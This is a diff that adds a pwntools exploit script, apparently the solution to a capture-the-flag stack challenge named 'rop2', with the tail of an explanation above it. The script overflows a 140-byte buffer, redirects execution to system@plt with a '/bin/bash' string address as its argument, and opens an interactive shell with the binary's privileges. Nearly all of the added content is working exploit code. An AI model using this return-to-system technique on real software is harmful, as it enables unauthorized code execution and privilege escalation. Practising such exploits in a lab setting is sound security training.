@@ -95,3 +95,41 @@
  '**Note:** Ensure that the binary is set as executable and that all paths are '
  'correct. Running this script will give you a shell with the same privileges '
  'as the binary.')
+
+
+from pwn import *
+
+# Set up pwntools context for 32-bit Linux binary
+context(os='linux', arch='i386', log_level='info')
+
+# Path to the binary
+binary = './pwn/stack/rop-2/rop2'
+
+# Load the ELF binary
+elf = ELF(binary)
+
+# Start the process
+p = process(binary)
+
+# Calculate the offset to the return address (140 bytes)
+offset = 140
+
+# Find the address of 'system' function in the PLT
+system_plt = elf.plt['system']
+log.info(f"system@plt address: {hex(system_plt)}")
+
+# Find the address of the '/bin/bash' string in the binary's data section
+binbash = next(elf.search(b'/bin/bash'))
+log.info(f"/bin/bash string address: {hex(binbash)}")
+
+# Build the payload
+payload = b'A' * offset                # Overflow buffer to reach return address
+payload += p32(system_plt)             # Overwrite return address with system
+payload += b'BBBB'
+payload += p32(binbash)                # Argument to system function ('/bin/bash' address)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the spawned shell
+p.interactive()
